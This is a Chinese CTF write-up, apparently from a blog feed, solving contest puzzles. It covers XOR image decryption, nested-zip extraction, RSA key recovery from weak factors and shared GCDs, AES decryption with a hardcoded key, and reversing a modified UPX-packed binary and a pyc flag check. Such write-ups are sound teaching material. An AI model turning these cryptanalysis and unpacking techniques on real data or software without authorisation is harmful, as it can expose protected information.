    <content type="html"><![CDATA[<h1 id="暑假内部赛"><a href="#暑假内部赛" class="headerlink" title="暑假内部赛"></a>暑假内部赛</h1><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="小小侦探家"><a href="#小小侦探家" class="headerlink" title="小小侦探家"></a>小小侦探家</h2><p><img src="/./img/49277317_pcs59wAhXGj7qKhU/1722397780481-2b833edb-ad78-4fb0-9801-77ae953a8dc3-975134.png" alt="1722397780481-2b833edb-ad78-4fb0-9801-77ae953a8dc3.png"></p><p><img src="/./img/49277317_pcs59wAhXGj7qKhU/1722397891416-ae242081-6efb-4dd9-b785-e25c634eae1e-449237.png" alt="1722397891416-ae242081-6efb-4dd9-b785-e25c634eae1e.png"></p><p><img src="/./img/49277317_pcs59wAhXGj7qKhU/1722398014481-0d0a3e12-fc0c-4270-ad50-436fb318d21a-077386.png" alt="1722398014481-0d0a3e12-fc0c-4270-ad50-436fb318d21a.png"></p><h3 id="encode"><a href="#encode" class="headerlink" title="encode"></a>encode</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs plain"># uncompyle6 version 3.9.1<br># Python bytecode version base 3.8.0 (3413)<br># Decompiled from: Python 3.10.9 | packaged by Anaconda, Inc. | (main, Mar  1 2023, 18:18:15) [MSC v.1916 64 bit (AMD64)]<br># Embedded file name: encode.py<br><br><br>def xor_encrypt(input_bytes, key):<br>    key_length = len(key)<br>    output_bytes = bytearray(len(input_bytes))<br>    for i in range(len(input_bytes)):<br>        output_bytes[i] = input_bytes[i] ^ key[i % key_length]<br>    else:<br>        return output_bytes<br><br><br>def encrypt_image(input_file, output_file):<br>    key = b&#x27;whereamifindme&#x27;<br>    with open(input_file, &quot;rb&quot;) as f:<br>        image_data = f.read()<br>    encrypted_data = xor_encrypt(image_data, key)<br>    with open(output_file, &quot;wb&quot;) as f:<br>        f.write(encrypted_data)<br>    print(f&quot;Encryption completed. Encrypted image saved to &#123;output_file&#125;&quot;)<br><br><br>if __name__ == &quot;__main__&quot;:<br>    input_file = &quot;1.jpg&quot;<br>    output_file = &quot;flag.jpg&quot;<br>    encrypt_image(input_file, output_file)<br><br># okay decompiling encode.pyc<br></code></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs plain">def xor_encrypt(input_bytes, key):<br>    key_length = len(key)<br>    output_bytes = bytearray(len(input_bytes))<br>    for i in range(len(input_bytes)):<br>        output_bytes[i] = input_bytes[i] ^ key[i % key_length]<br>    else:<br>        return output_bytes<br><br>def encrypt_image(input_file, output_file):<br>    key = b&#x27;whereamifindme&#x27;<br>    with open(input_file, &quot;rb&quot;) as f:<br>        image_data = f.read()<br>    encrypted_data = xor_encrypt(image_data, key)<br>    with open(output_file, &quot;wb&quot;) as f:<br>        f.write(encrypted_data)<br>    print(f&quot;Encryption completed. Encrypted image saved to &#123;output_file&#125;&quot;)<br><br><br>def xor_decrypt(input_bytes, key):<br>    # XOR 解密与加密是相同的操作<br>    return xor_encrypt(input_bytes, key)<br><br>def decrypt_image(input_file, output_file):<br>    key = b&#x27;whereamifindme&#x27;<br>    with open(input_file, &quot;rb&quot;) as f:<br>        encrypted_data = f.read()<br>    decrypted_data = xor_decrypt(encrypted_data, key)<br>    with open(output_file, &quot;wb&quot;) as f:<br>        f.write(decrypted_data)<br>    print(f&quot;Decryption completed. Decrypted image saved to &#123;output_file&#125;&quot;)<br><br>if __name__ == &quot;__main__&quot;:<br>    input_file = &quot;flag.jpg&quot;<br>    output_file = &quot;decrypted.jpg&quot;<br>    decrypt_image(input_file, output_file)<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_pcs59wAhXGj7qKhU/1722398450272-655e73bb-6216-4884-bced-31dbdd3aa0f5-314344.jpeg" alt="1722398450272-655e73bb-6216-4884-bced-31dbdd3aa0f5.jpeg"></p><h3 id="嗯，美国的朋友"><a href="#嗯，美国的朋友" class="headerlink" title="嗯，美国的朋友"></a>嗯，美国的朋友</h3><p><img src="/./img/49277317_pcs59wAhXGj7qKhU/1722398785203-3e0820c5-db73-48ad-ab71-bccfdc9784a8-621844.png" alt="1722398785203-3e0820c5-db73-48ad-ab71-bccfdc9784a8.png"></p><h3 id="正常"><a href="#正常" class="headerlink" title="正常"></a>正常</h3><p><img src="/./img/49277317_pcs59wAhXGj7qKhU/1722403659378-1f7b980a-0fe0-4dcd-8f7a-76a496251b57-426945.png" alt="1722403659378-1f7b980a-0fe0-4dcd-8f7a-76a496251b57.png"></p><p><img src="/./img/49277317_pcs59wAhXGj7qKhU/1722403257515-77115410-a107-44b4-8e9e-64ef04811208-245937.jpeg" alt="1722403257515-77115410-a107-44b4-8e9e-64ef04811208.jpeg"></p><h2 id="Matryoshka"><a href="#Matryoshka" class="headerlink" title="Matryoshka"></a><font style="color:rgb(33, 37, 41);">Matryoshka</font></h2><p>exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs plain">import zipfile<br>import os<br>import shutil<br>import uuid<br><br>def extract_zip(zip_path, extract_to):<br>    &quot;&quot;&quot;解压缩指定的 ZIP 文件到指定目录&quot;&quot;&quot;<br>    with zipfile.ZipFile(zip_path, &#x27;r&#x27;) as zip_ref:<br>        zip_ref.extractall(extract_to)<br>    print(f&quot;Extracted: &#123;zip_path&#125; to &#123;extract_to&#125;&quot;)<br><br>def find_and_extract_zips(base_folder, temp_folder, output_folder):<br>    &quot;&quot;&quot;递归查找并解压所有 ZIP 文件&quot;&quot;&quot;<br>    for root, dirs, files in os.walk(base_folder):<br>        for file in files:<br>            file_path = os.path.join(root, file)<br>            if file.endswith(&#x27;.zip&#x27;):<br>                unique_folder = os.path.join(temp_folder, str(uuid.uuid4()))  # 创建唯一的临时文件夹<br>                os.makedirs(unique_folder, exist_ok=True)<br>                extract_zip(file_path, unique_folder)<br>                os.remove(file_path)  # 解压后删除 ZIP 文件<br>                print(f&quot;Deleted: &#123;file_path&#125;&quot;)<br>                # 在新解压出的目录中继续查找 ZIP 文件<br>                find_and_extract_zips(unique_folder, temp_folder, output_folder)<br>            else:<br>                # 将最里面的文件移动到输出文件夹<br>                destination_path = os.path.join(output_folder, file)<br>                shutil.move(file_path, destination_path)<br>                print(f&quot;Moved: &#123;file_path&#125; to &#123;destination_path&#125;&quot;)<br><br>if __name__ == &quot;__main__&quot;:<br>    input_folder = r&quot;D:\网站下载\exppy&quot;  # 指定包含嵌套 ZIP 文件的根目录<br>    temp_folder = r&quot;D:\临时解压文件夹&quot;  # 用于解压的临时目录<br>    output_folder = r&quot;D:\解压后的文件&quot;  # 所有文件提取到的目标文件夹<br>    os.makedirs(temp_folder, exist_ok=True)  # 确保临时目录存在<br>    os.makedirs(output_folder, exist_ok=True)  # 确保输出目录存在<br><br>    find_and_extract_zips(input_folder, temp_folder, output_folder)<br>    print(&quot;所有文件提取完毕&quot;)<br></code></pre></td></tr></table></figure><p>然后爆破密码</p><p><img src="/./img/49277317_pcs59wAhXGj7qKhU/1722405394869-3053321d-2392-4bf1-831a-52ca60e4ea85-758430.png" alt="1722405394869-3053321d-2392-4bf1-831a-52ca60e4ea85.png"></p><p><img src="/./img/49277317_pcs59wAhXGj7qKhU/1722405509167-7ac1f6a2-d88f-47b7-870f-52683d7378e6-438167.png" alt="1722405509167-7ac1f6a2-d88f-47b7-870f-52683d7378e6.png"></p><p><img src="/./img/49277317_pcs59wAhXGj7qKhU/1722405565617-1b8e32f8-5cb4-4c41-b73b-3f8503c0b50a-435181.png" alt="1722405565617-1b8e32f8-5cb4-4c41-b73b-3f8503c0b50a.png"></p><p><img src="/./img/49277317_pcs59wAhXGj7qKhU/1722414218554-683f8729-2586-4d4a-8c6c-16ba93b8b717-785659.png" alt="1722414218554-683f8729-2586-4d4a-8c6c-16ba93b8b717.png"></p><p>改成zip然后解压缩</p><p><img src="/./img/49277317_pcs59wAhXGj7qKhU/1722414251376-5ce7e95f-e361-4c91-970e-5a91af357fef-481038.png" alt="1722414251376-5ce7e95f-e361-4c91-970e-5a91af357fef.png"></p><p>然后就拿到照片不会了</p><p><img src="/./img/49277317_pcs59wAhXGj7qKhU/1722416548417-646cec90-78b0-4b2b-916a-cecf412d9df2-027150.png" alt="1722416548417-646cec90-78b0-4b2b-916a-cecf412d9df2.png"></p><p><font style="color:#DF2A3F;">来自周神的万能py（伟大无需多言）</font></p><p><img src="/./img/49277317_pcs59wAhXGj7qKhU/1722418852200-7b993f45-1759-460b-83c0-ba5527519a17-628243.png" alt="1722418852200-7b993f45-1759-460b-83c0-ba5527519a17.png"></p><p><img src="/./img/49277317_pcs59wAhXGj7qKhU/1722418885797-0bb5ed61-03ad-4f1b-82b0-bae001f8c022-510692.png" alt="1722418885797-0bb5ed61-03ad-4f1b-82b0-bae001f8c022.png">\</p><p>sb0olI</p><p>WkpHU1VDVEZ7ODY1ODYzNkItNDJGMy0zNjQ4LTVCMjUtQUY2Q0RCRjI5NTI5fQ&#x3D;&#x3D;</p><p><img src="/./img/49277317_pcs59wAhXGj7qKhU/1722419785126-873c394b-a883-44e1-882b-acb89c8cf994-998654.png" alt="1722419785126-873c394b-a883-44e1-882b-acb89c8cf994.png"></p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a><font style="color:rgb(33, 37, 41);">CRYPTO</font></h1><h2 id="phi"><a href="#phi" class="headerlink" title="phi"></a>phi</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs plain">def euler_totient(n):<br>    result = n  # Initialize result as n<br>    p = 2<br>    # Consider all prime factors of n and subtract their multiples from result<br>    while p * p &lt;= n:<br>        # Check if p is a prime factor<br>        if n % p == 0:<br>            # If yes, then update n and result<br>            while n % p == 0:<br>                n //= p<br>            result -= result // p<br>        p += 1<br>    # If n has a prime factor greater than sqrt(n)<br>    # (There can be at most one such prime factor)<br>    if n &gt; 1:<br>        result -= result // n<br>    return result<br><br>n = int(input(&quot;Enter a number: &quot;))<br>print(f&quot;The number of integers less than &#123;n&#125; that are coprime with &#123;n&#125; is &#123;euler_totient(n)&#125;.&quot;)<br></code></pre></td></tr></table></figure><h2 id="basic-RSA"><a href="#basic-RSA" class="headerlink" title="basic_RSA"></a><font style="color:rgb(33, 37, 41);">basic_RSA</font></h2><p>获得p，q</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plain">n = 8518969207529636389484032230886536704406768047371377256638626913642749445259329340941109791553519452501892180150380956873522604338824472473236167891564393<br>p = 983335626386310597717550945092743654289318641603143018459883485703236916430<br>q = 866333831393483651450507450957397118458633113000718740740857324290558250886<br><br>for i in range(100):<br>    for j in range(100):<br>        if((p*100+i)*(q*100+j)==n):<br>            print(&quot;p=&quot;,p*100+i)<br>            print(&quot;q=&quot;,q*100+j)<br>            break<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_pcs59wAhXGj7qKhU/1722394870801-73a3b752-0451-422b-87df-6fa6e8599de9-723580.png" alt="1722394870801-73a3b752-0451-422b-87df-6fa6e8599de9.png"></p><p>解密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plain">import gmpy2<br>from Crypto.Util.number import long_to_bytes<br><br>q =86633383139348365145050745095739711845863311300071874074085732429055825088613<br>p =98333562638631059771755094509274365428931864160314301845988348570323691643061<br><br>e = 65537<br>c = 6562905193530371491664319145474869160361926759601288401756039886752371060413124293251174780962557430362519513676355513923070074558557958599788395941875438<br># n=8518969207529636389484032230886536704406768047371377256638626913642749445259329340941109791553519452501892180150380956873522604338824472473236167891564393<br>n = q * p<br># print(n)<br>d = gmpy2.invert(e, (p - 1) * (q - 1))<br>print(&quot;d=&quot;, d)<br>m = pow(c, d, n)<br>print(m)<br>print(long_to_bytes(m))<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_pcs59wAhXGj7qKhU/1722395080668-cbdd4cc6-4216-4a81-8fe9-08e2c9e085e3-227906.png" alt="1722395080668-cbdd4cc6-4216-4a81-8fe9-08e2c9e085e3.png"></p><h2 id="enc"><a href="#enc" class="headerlink" title="enc"></a>enc</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs plain">from Crypto.Cipher import AES<br>import base64<br>import json<br><br># 与JavaScript中相同的密钥和IV<br>key = b&#x27;1234123412ABCDEF&#x27;<br>iv = b&#x27;1234123412ABCDEF&#x27;<br><br><br>def decrypt(encrypted_text):<br>    # 将Base64编码的密文转换为字节<br>    encrypted_bytes = base64.b64decode(encrypted_text)<br><br>    # 使用AES进行解密<br>    cipher = AES.new(key, AES.MODE_CBC, iv)<br>    decrypted_bytes = cipher.decrypt(encrypted_bytes)<br><br>    # 去除填充<br>    pad_len = decrypted_bytes[-1]<br>    decrypted_bytes = decrypted_bytes[:-pad_len]<br><br>    # 将解密后的字节转换为字符串<br>    decrypted_text = decrypted_bytes.decode(&#x27;utf-8&#x27;)<br><br>    # 尝试解析为JSON对象<br>    try:<br>        decrypted_data = json.loads(decrypted_text)<br>        return decrypted_data<br>    except json.JSONDecodeError:<br>        return decrypted_text<br>a=&#x27;2rn7Wcu6OECQFBrkBSCzvQ==&#x27;<br>print(decrypt(a))<br></code></pre></td></tr></table></figure><h2 id="BASIC-rsa"><a href="#BASIC-rsa" class="headerlink" title="BASIC_rsa?"></a><font style="color:rgb(33, 37, 41);">BASIC_rsa?</font></h2><p>得到十进制的p</p><p><img src="/./img/49277317_pcs59wAhXGj7qKhU/1722407532145-51dcf492-3661-4a58-b389-120290df4e34-295609.png" alt="1722407532145-51dcf492-3661-4a58-b389-120290df4e34.png"></p><p>exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs plain">import gmpy2<br>from Crypto.Util.number import long_to_bytes<br><br>p = 11078621793949482625914372710810959398675963822415939216168633283415944613128498588716242943797946558845513908279515179517717865327915107375374373236695797<br><br>e = 65537<br>c = 34249174398573844561724553123097991805748045349941051239905387500962666334254143693989050793644602109372118418179926824099494693623993781741261080861283160331937184329685234484575779194527204931907049442889394176292943564908081818520471872867158523349155125154566723265694918287939042067461946833720803908419<br><br>n = 127697470012830699516312095200727334137458073897637275467480374448830146587852701396242747281584152916736575300669782612348674479798285191271836719149002228481986613159355642035344516698166166815694171737146410931677450051628031191289869988494519088068698936030651830429428544621447638050279630876476422484677<br><br># 确保 q 是一个整数<br>q = n // p<br>print(&quot;q =&quot;, q)<br><br># 计算 d<br>phi = (p - 1) * (q - 1)<br>d = gmpy2.invert(e, phi)<br>print(&quot;d =&quot;, d)<br><br># 解密消息<br>m = pow(c, d, n)<br>print(&quot;m =&quot;, m)<br>print(&quot;Decrypted message:&quot;, long_to_bytes(m))<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_pcs59wAhXGj7qKhU/1722407696843-5044428b-c515-401a-adb4-9f5957ad25a7-504698.png" alt="1722407696843-5044428b-c515-401a-adb4-9f5957ad25a7.png"></p><h2 id="common（多组nc）"><a href="#common（多组nc）" class="headerlink" title="common（多组nc）"></a><font style="color:rgb(33, 37, 41);">common（多组nc）</font></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs plain">import gmpy2<br>import libnum<br>from Crypto.Util.number import long_to_bytes<br><br>n1 = 132963755548206229559127689166757584511233225283043942347398006713394304522162906766220322689091908141056178489298724072090068593524622575063324464083235534352678901324592982116353558072908375775464810233662811977377434641059529949137944412090936664215705396037823298138229472328757455343491215225582072326609<br>n2 = 135715978430684287381713379483929616945110106139653924228097245208713615447908876761578043850197920250417331466583068362027199914761824520739671581870758012290130748364801002790393321246996987185380538754400076604470645538272868000108348182618645865412772843015157084652883886834388848492901314867879577439991<br>c1 = 118311856007994446471425653368270431815268347185806809785193216737612021273781210857995561399953518478531629168544046740368055620359324847835880188911396310860156525631827183309640891399780327812381201798593921912143408764197609046182658951137157492643749925697701468531330210148652740735483028164075625352731<br>c2 = 10880604230339738820239117607212371216541411086376043211246572277203913063699089407935153227605276627875795616322147701707404835648471284140116567004143554388076937920404785484782546601765715529529539324463336305223709231573270251380061360588847679377993816543999438875782700254270857313316044309542281002278<br><br># ...此处省略20组n和c<br><br>e = 65537<br>n = []<br>c = []<br>p = []<br>for i in range(1, 2):<br>    n.append(eval(&#x27;n&#x27; + str(i)))<br>    c.append(eval(&#x27;c&#x27; + str(i)))<br>data = list(zip(n, c))<br>for i in range(len(n)):<br>    for j in range(i + 1, len(n)):<br>        if gmpy2.gcd(n[i], n[j]) != 1:<br>            print(i, j)  # i=4,j=17<br>            print(gmpy2.gcd(n[i], n[j]))<br>p = gmpy2.gcd(n1, n2)<br>q = n1 // p<br>d1 = gmpy2.invert(e, (p - 1) * (q - 1))<br>print(&quot;d1=&quot;,d1)<br>m1 = pow(c1, d1, n1)<br><br><br>p = gmpy2.gcd(n1, n2)<br>q = n2 // p<br>d2 = gmpy2.invert(e, (p - 1) * (q - 1))<br>print(&quot;d2=&quot;,d2)<br>m2 = pow(c2, d2, n2)<br>print(long_to_bytes(m1),end=&#x27;&#x27;)<br>print(long_to_bytes(m2))<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_pcs59wAhXGj7qKhU/1722407993358-c40157e2-3bf8-4e17-a67f-33543893e554-707537.png" alt="1722407993358-c40157e2-3bf8-4e17-a67f-33543893e554.png"></p><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="Hard-Signin"><a href="#Hard-Signin" class="headerlink" title="Hard_Signin"></a><font style="color:rgb(33, 37, 41);">Hard_Signin</font></h2><p>ida打不开，题目说文件被改了，放到010看一下</p><p><img src="/./img/49277317_pcs59wAhXGj7qKhU/1722396489215-630723df-f124-4f4c-a318-175adb3e7d0d-079811.png" alt="1722396489215-630723df-f124-4f4c-a318-175adb3e7d0d.png"></p><p>发现头被改了</p><h3 id="正常的头"><a href="#正常的头" class="headerlink" title="正常的头"></a>正常的头</h3><p><img src="/./img/49277317_pcs59wAhXGj7qKhU/1722396580134-e3f904ae-5e10-4225-8449-51366412b409-521311.png" alt="1722396580134-e3f904ae-5e10-4225-8449-51366412b409.png"></p><p>改回来就可以看到有个upx壳了</p><p><img src="/./img/49277317_pcs59wAhXGj7qKhU/1722396536086-20a9f578-d28f-4c0f-8938-c2d16a69438a-419317.png" alt="1722396536086-20a9f578-d28f-4c0f-8938-c2d16a69438a.png"></p><p><img src="/./img/49277317_pcs59wAhXGj7qKhU/1722396634438-b4f14c6d-cc4b-45e1-add4-48634d61004c-473857.png" alt="1722396634438-b4f14c6d-cc4b-45e1-add4-48634d61004c.png"></p><p>脱壳后放入ida得到flag</p><p><img src="/./img/49277317_pcs59wAhXGj7qKhU/1722396435274-41529e7f-40f3-4e19-adc2-2902c4be58e2-406281.png" alt="1722396435274-41529e7f-40f3-4e19-adc2-2902c4be58e2.png"></p><h3 id="不要非预期"><a href="#不要非预期" class="headerlink" title="不要非预期"></a><font style="color:#DF2A3F;">不要非预期</font></h3><p><img src="/./img/49277317_pcs59wAhXGj7qKhU/1722389363066-66f2c5b1-b33c-4252-9831-40c3e1c3edad-327027.png" alt="1722389363066-66f2c5b1-b33c-4252-9831-40c3e1c3edad.png"></p><h2 id="Python-Revenge"><a href="#Python-Revenge" class="headerlink" title="Python_Revenge"></a><font style="color:rgb(33, 37, 41);">Python_Revenge</font></h2><p>3.10</p><p>magic number 6F 0D 0D 61</p><p><img src="/./img/49277317_pcs59wAhXGj7qKhU/1722412845734-95b21973-c815-4e02-beee-9f16de23579b-217465.png" alt="1722412845734-95b21973-c815-4e02-beee-9f16de23579b.png"></p><p>将后缀改成pyc</p><p>放到kali里面用pycdc反编译</p><p><img src="/./img/49277317_pcs59wAhXGj7qKhU/1722413189287-cb2557d4-dbdc-4a10-bc1c-3f0c35b57ba5-822133.png" alt="1722413189287-cb2557d4-dbdc-4a10-bc1c-3f0c35b57ba5.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs plain"># Source Generated with Decompyle++<br># File: python.pyc (Python 3.10)<br><br>import base64<br>str = &#x27;&#x27;<br>print(&#x27;Please input your flag:&#x27;)<br>str1 = input(str)<br>a = base64.b64encode(str1.encode(&#x27;utf-8&#x27;))<br>a = a.decode()<br>s = []<br>s1 = [72,112,107,87,68,86,49,85,55,90,69,86,122,66,85,90,119,57,86,101,102,78,87,101,102,53,87,97,50,78,106,99,122,74,88,90,61,48,88,90]<br>for i in range(len(a)):<br>    s.append(ord(a[i]))<br>for i in range(0, len(s), 4):<br>    s[i] = s[i + 3]<br>    s[i + 3] = s[i]<br>    s[i + 1] = s[i + 2]<br>    s[i + 2] = s[i + 1]<br>for i in range(len(s)):<br>    if s[i] != s1[i]:<br>        print(&#x27;Wrong&#x27;)<br>        exit(0)<br>print(&#x27;success&#x27;)<br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plain">import base64<br><br>s = [72, 112, 107, 87, 68, 86, 49, 85, 55, 90, 69, 86, 122, 66, 85, 90, 119, 57, 86, 101, 102, 78, 87, 101, 102, 53, 87, 97, 50, 78, 106, 99, 122, 74, 88, 90, 61, 48, 88, 90]<br><br><br>for i in range(0, len(s), 4):<br>    s[i], s[i + 3] = s[i + 3], s[i]<br>    s[i + 1], s[i + 2] = s[i + 2], s[i + 1]<br>encoded_str = &#x27;&#x27;.join(chr(num) for num in s)<br><br>original_str = base64.b64decode(encoded_str).decode(&#x27;utf-8&#x27;)<br><br>print(original_str)<br><br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_pcs59wAhXGj7qKhU/1722413890009-eba83a0e-8090-47ae-9fc6-f601b94e503d-501448.png" alt="1722413890009-eba83a0e-8090-47ae-9fc6-f601b94e503d.png"></p><h2 id="Assembly-Yao"><a href="#Assembly-Yao" class="headerlink" title="Assembly_Yao"></a><font style="color:rgb(33, 37, 41);">Assembly_Yao</font></h2><p>edx&#x3D;‘@’ 0x40</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1722388649160-1eb53baa-d51d-4e55-b325-0aac84c7635e.png"></p><blockquote><p>更新: 2024-12-24 15:55:53<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/qh5y1yli8mfx1q3b">https://www.yuque.com/chaye-apqbl/vsc85q/qh5y1yli8mfx1q3b</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/WP/2024/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%9F%BA%E7%A1%80%EF%BC%8815%EF%BC%89/"/>
    <url>/2026/01/19/WP/2024/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%9F%BA%E7%A1%80%EF%BC%8815%EF%BC%89/</url>
    
